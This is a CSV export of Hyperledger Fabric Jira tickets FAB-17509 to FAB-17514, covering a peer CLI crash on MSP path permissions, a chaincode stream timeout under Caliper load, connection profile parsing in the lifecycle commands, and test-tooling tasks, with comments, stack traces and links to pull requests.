Peer CLI crashes if no permission to access MSP path,FAB-17509,44363,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sstone1,sstone1,sstone1,17/Feb/20 10:51 PM,26/Feb/20 11:41 AM,28/Oct/23 3:09 AM,26/Feb/20 11:41 AM,,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,,,,,,"[https://github.com/hyperledger/fabric/blob/release-1.4/peer/common/common.go#L126]

This code does not cater for the case of *os.Stat* returning an error that is not ENOENT, for example if the process has no permissions to access a parent directory. This results in a SIGSEGV as we try to access *fi*. ",,sstone1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0199n:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sstone1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to add an org to an existing consortium,FAB-17510,44365,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,sykesm,sykesm,17/Feb/20 11:15 PM,17/Mar/20 4:24 AM,28/Oct/23 3:09 AM,27/Feb/20 1:35 AM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,configtx,ipm,,,,"As a fabric administrator, I want to use a fit-for-purpose function that adds an org definition to a named consortium in system channel configuration. This result of this function should be a channel update transaction that can later be signed.

 Acceptance

Calling the new function with appropriate arguments should generate a config update transaction that semantically matches one produced by the process that uses {{configtxgen}} {{-printOrg}}, {{protolator}}, and {{configtxgen}}.

This story is only concerned with adding the org to the consortium - not creating a channel.

Most of the manual steps are documented here: https://hyperledger-fabric.readthedocs.io/en/release-2.0/channel_update_tutorial.html",,sykesm,tsharris,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17573,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzf",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tsharris,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Feb/20 11:15 AM;wlahti;[https://github.com/hyperledger/fabric/pull/708];;;","28/Feb/20 5:44 AM;tsharris;[https://github.com/hyperledger/fabric/pull/759];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move operator/testdata to /regression,FAB-17511,44367,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,btl5037,btl5037,18/Feb/20 11:21 AM,22/Feb/20 6:35 AM,28/Oct/23 3:09 AM,22/Feb/20 6:35 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The testdata belongs to the regression directory, it should be moved there and references updated",,btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zui",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,suryalnvs,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Feb/20 5:38 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/100;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode stream terminating,FAB-17512,44372,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,nkl199,nkl199,19/Feb/20 12:54 AM,20/Nov/20 7:16 AM,28/Oct/23 3:09 AM,20/Nov/20 7:16 AM,v1.4.6,v2.0.0,,,,,,,,,,,,fabric-peer,,,,,,,,,1,ipm2,quality,,,,"Whilst performing some benchmarking we have hit issues within both levelDB and couchDB, whereby the transactions are being rejected. This is repeatable.

This has been found when running benchmarks on a RHEL7 server, using Caliper clients, driving a benchmark that is query heavy. We have witnessed failures in rich queries, range queries and batch retrieval style queries (return multiple items obtained via repeat gets within the same invoke).

In couchDB we appear to be breaking a timeout threshold on connecting through to the database such that the chaincode definition is not obtainable, and in levelDB there is an alternative failure resulting in the error message:

Error: error in simulation: failed to execute transaction ea72d05e2b4a3901e97f27da7a4ee786871522237603f795c09a16ba57340de1: error sending: chaincode stream terminated
 at self._endorserClient.processProposal (/home/lynn14m/git/caliper/node_modules/fabric-network/node_modules/fabric-client/lib/Peer.js:137:36)
 at Object.onReceiveStatus (/home/lynn14m/git/caliper/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:1207:9)
 at InterceptingListener._callNext (/home/lynn14m/git/caliper/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:568:42)
 at InterceptingListener.onReceiveStatus (/home/lynn14m/git/caliper/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:618:8)
 at callback (/home/lynn14m/git/caliper/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:845:24)

Since the above is repeatable, we can get logs for components involved (and can repeat with varying log level).

Further log will be obtained for the peers (with a different log level) to assist with analysis as soon as they are generated.",,btl5037,denyeart,jorgego,manish-sethi,nkl199,robmurgai,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Apr/20 4:36 AM;jorgego;mixed-rich-query-asset.js;https://jira.hyperledger.org/secure/attachment/18309/mixed-rich-query-asset.js","25/Apr/20 4:37 AM;jorgego;mixed-rich-query-pagination.yaml;https://jira.hyperledger.org/secure/attachment/18310/mixed-rich-query-pagination.yaml","24/Apr/20 9:08 AM;jorgego;org1peer-85cfd647db-wq5sl-chaincode-logs.log;https://jira.hyperledger.org/secure/attachment/18304/org1peer-85cfd647db-wq5sl-chaincode-logs.log","24/Apr/20 9:08 AM;jorgego;org1peer-85cfd647db-wq5sl-couchdb.log;https://jira.hyperledger.org/secure/attachment/18303/org1peer-85cfd647db-wq5sl-couchdb.log","24/Apr/20 9:08 AM;jorgego;org1peer-85cfd647db-wq5sl-dind.log;https://jira.hyperledger.org/secure/attachment/18307/org1peer-85cfd647db-wq5sl-dind.log","24/Apr/20 9:08 AM;jorgego;org1peer-85cfd647db-wq5sl-peer.log;https://jira.hyperledger.org/secure/attachment/18306/org1peer-85cfd647db-wq5sl-peer.log","24/Apr/20 9:08 AM;jorgego;org1peer-85cfd647db-wq5sl-proxy.log;https://jira.hyperledger.org/secure/attachment/18305/org1peer-85cfd647db-wq5sl-proxy.log",,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019az:",,,,Unset,Unset,,"The problem happens while running Caliper Benchmarks for Paginated Rich Query
https://hyperledger.github.io/caliper-benchmarks/fabric/performance/2.0.0/nodeJS/nodeSDK/evaluate/paginated-rich-query/",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,jorgego,manish-sethi,nkl199,robmurgai,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Feb/20 5:47 AM;btl5037;Hey Nick, we will check this out once we have the logs.

Thanks;;;","10/Mar/20 12:49 PM;btl5037;Nick, do you have any logs to support what you've seen here? We are still interested in investigating this;;;","24/Apr/20 9:07 AM;jorgego;I experimented the same problems as described below. I have uploaded the logs for my run on CouchDB. There is a time out error that only shows up when the load is increased.

The error is easily reproduced.   I am running Fabric v1.4.6

 

2020.04.23-19:58:27.702 error [caliper] [adapters/fabric] Failed to evaluate transaction [paginatedRichQuery] using arguments [\{""selector"":{""docType"":""fixed-asset"",""creator"":""client3""}},10,], with error: Error: failed to execute transaction b29a87dccd36594bb5fe96169d90519d3450fd9a2389ce47e6feaf6b919f1357: error sending: timeout expired while executing transaction
 at self._endorserClient.processProposal (/usr/local/lib/node_modules/fabric-network/node_modules/fabric-client/lib/Peer.js:144:36)
 at Object.onReceiveStatus (/usr/local/lib/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:1207:9)
 at InterceptingListener._callNext (/usr/local/lib/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:568:42)
 at InterceptingListener.onReceiveStatus (/usr/local/lib/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:618:8)
 at callback (/usr/local/lib/node_modules/fabric-network/node_modules/grpc/src/client_interceptors.js:845:24)

 ;;;","24/Apr/20 11:01 AM;btl5037;Out of curiosity, has anyone tested this against open source images with the official couchdb images (not fabric-couchdb), this SaaS offering builds their own images from source.

[~jorgego] or [~nkl199] can either of you provide the Caliper artifacts we can use to recreate this scenario, that would make it more likely that we could get to investigating this sooner as we wouldn't have to create the Caliper artifacts ourselves.

And how many queries per second were you running when you started to see the timeouts, I'd like to try doing this with our tool, but I'd need to know how many concurrent drivers I would need to recreate this.

Thanks guys!;;;","24/Apr/20 12:15 PM;denyeart;When you overload a peer with queries beyond the peer's capacity, the queries are going to start timing out and the proposal request will therefore return a failure. I don't think there is a bug per se that can get fixed in these scenarios. The important thing when a peer is overloaded, is that commits continue with data integrity, and that the peer behaves as expected after the load storm.;;;","25/Apr/20 4:34 AM;jorgego;[~btl5037]

To answer your question, I have not tested against open source images with the official couchdb images.

I am running caliper v0.2.0 locally binded to Fabric v1.4.4 and the target network is a Fabric SaaS offering (IBP) that runs Fabric v1.4.6 with the caliper benchmarks chaincode called *fixed-asset* in Node with a couchDB index set.

The network is two Orgs with one peer each on couchDB

The caliper command is:

caliper benchmark run --caliper-benchconfig benchmarks/api/fabric/couchDB/*mixed-rich-query-pagination.yaml* --caliper-networkconfig networks/fabric/fabric-v1.4.1/2org1peercouchdb_raft/api/channelcouch_fixed-asset_profile.json --caliper-workspace /Users/jorgego/Documents/CODE/caliper-benchmarks --caliper-flow-only-test --caliper-fabric-usegateway true --caliper-fabric-discovery true --caliper-fabric-gatewaylocalhost false

I have attached both *mixed-rich-query-pagination.yaml* and *mixed-rich-query-asset.js*

One thing I noticed is that the CPU utilization of the couchDB container is very high. It goes beyond the assigned 4 vcpu.  I was able to run 3-4 TPS but anything beyond that creates the timeouts.;;;","29/Apr/20 8:18 PM;nkl199;On LevelDB the logs are slightly different (this is from OS images Fabric v2.1.0), obtained by running the Caliper benchmarks [https://github.com/hyperledger/caliper-benchmarks/tree/master/benchmarks/api/fabric]:

Chaincode logs:
{quote}{{2020-04-29T11:01:06.074Z error [c-api:contracts-spi/chaincodefromcontract.js]     [mychannel-d73be31e] Error: QUERY_STATE_CLOSE failed: transaction ID: d73be31e4d2f6282b0aa11fe957640ecd4ba6a0d559b3072ff75e374b46a52e6: no ledger context 

2020-04-29T11:01:06.077Z error [c-api:lib/handler.js]                             [mychannel-d73be31e] Calling chaincode Invoke() returned error response [Error: QUERY_STATE_CLOSE failed: transaction ID: d73be31e4d2f6282b0aa11fe957640ecd4ba6a0d559b3072ff75e374b46a52e6: no ledger context

    at parseResponse (/usr/local/src/node_modules/fabric-shim/lib/handler.js:716:15)

    at MsgQueueHandler.handleMsgResponse (/usr/local/src/node_modules/fabric-shim/lib/handler.js:142:40)

    at ClientDuplexStream.<anonymous> (/usr/local/src/node_modules/fabric-shim/lib/handler.js:298:46)

    at ClientDuplexStream.emit (events.js:311:20)

    at addChunk (_stream_readable.js:294:12)

    at readableAddChunk (_stream_readable.js:275:11)

    at ClientDuplexStream.Readable.push (_stream_readable.js:209:10)

    at Object.onReceiveMessage (/usr/local/src/node_modules/grpc/src/client_interceptors.js:1297:19)

    at InterceptingListener.recvMessageWithContext (/usr/local/src/node_modules/grpc/src/client_interceptors.js:607:19)

    at /usr/local/src/node_modules/grpc/src/client_interceptors.js:707:14]. Sending ERROR message back to peer
 }}
  
{quote}
Corresponding Peer logs:
{quote}{{no ledger context

github.com/hyperledger/fabric/core/chaincode.(*Handler).isValidTxSim

/go/src/github.com/hyperledger/fabric/core/chaincode/handler.go:516

github.com/hyperledger/fabric/core/chaincode.(*Handler).HandleTransaction

/go/src/github.com/hyperledger/fabric/core/chaincode/handler.go:232

runtime.goexit

/usr/local/go/src/runtime/asm_amd64.s:1373

2020-04-29 11:02:20.306 UTC [chaincode] HandleTransaction -> ERRO b31 [bdc27e09] Failed to handle QUERY_STATE_CLOSE. error: no ledger context

github.com/hyperledger/fabric/core/chaincode.(*Handler).isValidTxSim

/go/src/github.com/hyperledger/fabric/core/chaincode/handler.go:516

github.com/hyperledger/fabric/core/chaincode.(*Handler).HandleTransaction

/go/src/github.com/hyperledger/fabric/core/chaincode/handler.go:232

runtime.goexit

/usr/local/go/src/runtime/asm_amd64.s:1373

QUERY_STATE_CLOSE failed: transaction ID: bdc27e0911817363c17603aa028ef8d7e97aa0f1c5ab6dff60b132ee8067e077

github.com/hyperledger/fabric/core/chaincode.(*Handler).HandleTransaction

/go/src/github.com/hyperledger/fabric/core/chaincode/handler.go:248

runtime.goexit

/usr/local/go/src/runtime/asm_amd64.s:1373

2020-04-29 11:02:27.200 UTC [chaincode] isValidTxSim -> ERRO b32 no ledger context: mychannel 5cb2d508eca84300e9a165f7afe78e3cec5f6f8b17588a5889d1990b642735e2}}
{quote}
 

 ;;;","19/May/20 7:00 AM;sykesm;Everything captured in this ticket is pointing to fallout from execution timeouts and/or query timeouts to couch.

When an application invokes chaincode, it eventually gets routed through {{Execute}} in {{ChaincodeSupport}}. That function creates a transaction for the transaction and then invokes the chaincode. While the chaincode is executing, the peer is waiting on one of three conditions:

1. Invocation completes
2. Timeout occurs
3. Chaincode terminates

When (1) happens, everyone is happy. When (2) happens, we record a metric and return a ""timeout expired"" error to the client. When (3) happens, we return a ""chaincode stream terminated"" error to the client. Regardless of which path runs, the transaction context is destroyed as the invocation that caused it to be created has completed.

Assuming the chaincode is still running when a timeout occurs, at some point one of two things will happen:

a. The chaincode completes execution.
b. The chaincode attempts to use a service provided by the peer.

When (a) happens, the response (error or success) will go back to the peer. The peer, receiving the response, will attempt to find the associated transaction context to clean it up before sending the response to the endorser for its processing. Since the context was cleaned up by the timeout, the peer will log the issue and move along with no further action as the client should already have received an error.

When (b) happens, the peer will attempt to find the transaction context but won't find it. Without a transaction context, there's no way to interact with the ledger so the peer will return an error to the chaincode. This is the ""no ledger context"" error you're seeing.

What happens next is entirely up to the chaincode. If the chaincode handles the error appropriately, it will respond to the peer with the error, the peer won't find the associated context, and it will simply log a message. If, however, the chaincode dies because it doesn't properly handle the error, the chaincode stream will terminate causing any other transactions that were sent to the chaincode to fail. The clients waiting for these transactions to complete will fall into condition (3) and get the ""chaincode stream terminated"" error.

Basically, it looks like it's working as intended. Unless I'm missing something, the load is too high for the system given the available resources and architecture.;;;","20/Nov/20 7:16 AM;manish-sethi;Closing this one. [~nkl199], feel free to open again if you have any more info.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unable to get peerAddress and/or tlsRootCertFiles when running peer lifecycle chaincode install-related commands with connection profile ,FAB-17513,44373,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,suryalnvs,suryalnvs,19/Feb/20 5:01 AM,09/Jul/20 3:10 AM,28/Oct/23 3:09 AM,09/Jul/20 3:10 AM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"We ran the following commands which we will call commands [A] and [B]:

*[A]:*
{code:java}
peer lifecycle chaincode install samplecc.tar.gz --connectionProfile ./connection-profile/connection_profile_org1.yaml --tls{code}
*[B]:*
{code:java}
peer lifecycle chaincode approveformyorg --channelID testorgschannel0 --name samplecc --version v1 --package-id sampleccv1:ecffead355f07b5c0ec7ab090a6bc1b6a86f3a6e99e04e2c3b74e2995ff2fb04 --sequence 1 --waitForEvent --orderer 127.0.0.1:30000 --tls --cafile $PWD/crypto-config/ordererOrganizations/ordererorg1/orderers/orderer0-ordererorg1.ordererorg1/tls/ca.crt --ordererTLSHostnameOverride orderer0-ordererorg1 --connectionProfile ./connection-profile/connection_profile_org1.yaml{code}
We will also refer to the  following code snippet as [C], which has two lines marked as [1] and [2] which we will refer to:
{code:java}
if input.ConnectionProfilePath != """" {
   networkConfig, err := common.GetConfig(input.ConnectionProfilePath)
   if err != nil {
      return err
   }
[1]   if len(networkConfig.Channels[input.ChannelID].Peers) != 0 {
      input.PeerAddresses = []string{}
      input.TLSRootCertFiles = []string{}
      for peer, peerChannelConfig := range networkConfig.Channels[input.ChannelID].Peers {
         if peerChannelConfig.EndorsingPeer {
            peerConfig, ok := networkConfig.Peers[peer]
            if !ok {
               return errors.Errorf(""peer '%s' is defined in the channel config but doesn't have associated peer config"", peer)
            }
            input.PeerAddresses = append(input.PeerAddresses, peerConfig.URL)
[2]            input.TLSRootCertFiles = append(input.TLSRootCertFiles, peerConfig.TLSCACerts.Path)
         }
      }
   }
}
{code}
When running the `lifecycle chaincode` commands with the --connectionProfile flag, the expectation is the peer CLI will parse the connection profile for the Peer endpoints and TLS information so it need not be provided on the CLI.

When running command `[A]` the peer is unable to parse the endpoint and TLS information as it is gated by line `[1]` in the code snippet, in particular, `networkConfig.Channels[input.ChannelID].Peers)`. This logic first checks that the Peers object is not empty and indexes base on `input.ChannelID`. The input object is made up of the flags passed on the command line, this command assumes the `channelID` flag was set, even though `install` commands don't take a `channelID` flag. We need to modify the logic not to check the `channelID` exists for commands which do not take the `channelID` flag.

For the command [B], the `peer.tlsCACerts` object can take either the PEM encoded certificate or the path to the certificate file. We can see on line `[2]` in the code snippet the there is no logic to handle the `peerConfig.TLSCACerts.Pem` field, the assumption is we are always passing around the file path in the connection profile, instead of the PEM. We have no tests and no example configs which test the PEM path and thus it went under the radar in 2.0 lifecycle. We should add logic to allow the passing of the explicit PEM object. For fabric-test this reduces the overhead of us having to pass the file around everywhere we run commands.",,btl5037,denyeart,suryalnvs,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17983,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzod",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,suryalnvs,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Feb/20 10:06 AM;btl5037;Looking more into this, command ""A"" is a more interesting scenario. The connection profile depends on the channel name to choose which endorsing peers to send to, but the channel name is not an input to the the install command, but it's a dependency to using a config profile for installation. There may be no good solution for scenario ""A"" as the only options I can think of here are, send to all endorsing peers, regardless of channel, or require the peer names be passed on the CLI still and then use the connection profile to look up their URL and TLS information, neither are really good solutions.;;;","26/Apr/20 12:52 PM;denyeart;Concerning [A], chaincode install is a management operation targeted for a single peer. Typically connection profiles are used so that the client can automatically pick any of the configured peers. Therefore I don't see a lot of value in using a connection profile with the chaincode install command. And if it were used, it should certainly pass in the target peer name of where you want the chaincode installed. Since the commands don't currently take a target peer name to be used with the connection profile, I'm inclined to defer this one and improve the command documentation to state that CLI connection profiles are not intended to be used for calls that should target a specific peer. However, I see that even the legacy 'peer chaincode install' command can accept a connection profile, but again, with no peer name passed. Let's check with [~wlahti] to see if he knows the original intent here.

Concerning [B], yes it does seem that both TLSCACerts.Path and TLSCACerts.Pem should be supported. That one can certainly be fixed with this issue.;;;","26/Apr/20 1:38 PM;btl5037;I had discussed this with both Will and Jason prior to opening this Jira. No one really remembered this code other than the fact it exists, but the best consensus we all settled on was the code was a copy and paste from legacy lifecycle, and since there was no functional test, it was never discovered this operation failed, despite the fact it was implemented.

I tried to implement something to make this work [A], but it became a larger surface area than I intended and punted on it. If we decided to allow it with a targetPeer flag, this would make it much easier, and operationally make an admins life simpler. Otherwise I think the CLI is sloppy given that the installs `help` command says it supports a connection profile. If we decide not to do anything, we should at least remove that flag on the install command.

I understand your point with option one, but from an operational standpoint, the fact we can't use a connection profile, when other operations support it is disappointing, it forces us to carry around a bunch of artifacts to perform simple tasks where a single connection profile could take the place and if we have to carry them around for one command, we may as well carry them around for all the commands.;;;","09/Jun/20 9:55 PM;wlahti;Taking a quick look at this now. I didn't realize anyone ever noticed the connection profile option for the CLI. We kinda tacked that on at the last minute so this is the first feedback on its usage that I'm aware of in the 2+ years it has existed. :) ;;;","10/Jun/20 1:02 AM;wlahti;For the install-related portion of this JIRA: [https://github.com/hyperledger/fabric/pull/1383]

Enabling use of the PEM bytes instead of the file are more involved changes and should be split into a new story (feature request) as PEM bytes for certificates has never been supported by the CLI up to this point. [~btl5037] [~suryalnvs] I assume you'd still like this functionality to be implemented? Should be fairly straightforward to do so, just want to be sure you'd still benefit from this work. ;;;","13/Jun/20 12:11 PM;btl5037;Yes, this would still make our lives way easier. However, I think its going to carry some additional baggage with it. While testing this out a while back I think I figured out why for legacy reasons we required stuff to be base64 encoded. In this case, when you try to embed the pem in the connection profile, Viper loses its mind while trying to unmarshal the struct as it does recognize the multiline operator in yaml properly, so

pem: |

  bytes

Does recognize the vertical bar as valid. Just a heads up in case you encounter it, its possible it might be an easy fix to work around, but we all know Viper has more than a few problems in it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE consolidates adding channel peers,FAB-17514,44374,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,20/Feb/20 12:05 AM,22/Feb/20 7:25 AM,28/Oct/23 3:09 AM,22/Feb/20 7:25 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"There are many channel add peers APIs in pte-execReqest.js for each targeted peer selection, such as OrgAnchor and AllPeers.  This task is to consolidate them into one API, assignChannelPeers()

Also to change the query count based on the target peer type, for example, in the case of targetPeers is allPeers, each query transaction is sent to all peers listed in the connection profile, so each transaction is counted as number of all peers.",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-2247,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zu",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Feb/20 6:25 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/98];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
